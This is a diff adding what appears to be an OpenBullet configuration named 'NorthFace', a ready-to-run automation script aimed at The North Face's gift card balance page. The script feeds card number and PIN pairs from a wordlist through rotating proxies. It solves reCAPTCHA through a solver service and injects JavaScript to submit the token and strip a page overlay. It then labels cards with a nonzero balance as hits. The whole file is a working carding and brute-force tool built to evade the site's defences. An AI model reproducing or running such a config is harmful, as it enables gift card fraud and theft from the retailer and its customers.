@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "NorthFace",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-10T03:58:44.9446722+00:00",
+  "AdditionalInfo": "",
+  "Author": "KM",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 1,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": true,
+  "AlwaysQuit": true,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+NAVIGATE "https://www.thenorthface.com/shop/VFGiftCardBalanceView?langId=-1&storeId=7001" 60 
+RECAPTCHA "https://www.thenorthface.com/shop/VFGiftCardBalanceView?langId=-1&storeId=7001" "6LcgsBwUAAAAAFmTOge92jzgYaxzWF_og_pFCL4k" -> VAR "CAP" 
+EXECUTEJS "document.getElementById('g-recaptcha-response').innerHTML = '<CAP>'; var element = document.getElementById('monetate_lightbox'); element.parentNode.removeChild(element);" 
+ELEMENTACTION Id "cardNumber" 
+  SendKeys "<USER>" -> VAR "" 
+ELEMENTACTION Id "cardPin" 
+  SendKeys "<PASS>" -> VAR "" 
+ELEMENTACTION Id "gcSubmitBtn" 
+  Click "" -> VAR "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Gift card information is not valid." 
+  KEYCHAIN Success OR 
+    KEY "<div id=\"giftCardFrmTxt\"" 
+  KEYCHAIN Retry OR 
+    KEY "Entered captcha is wrong." 
+PARSE "<SOURCE>" LR "<div id=\"giftCardFrmTxt\" class=\"gift-card-check-response-text-wrapper\"><b>Gift Card Balance : </b>" "</div>" Recursive=FALSE -> VAR "Balance" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<Balance>" NotEqualTo "0.00" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<Balance>" EqualTo "0.00" 
+BROWSERACTION ClearCookies "" 
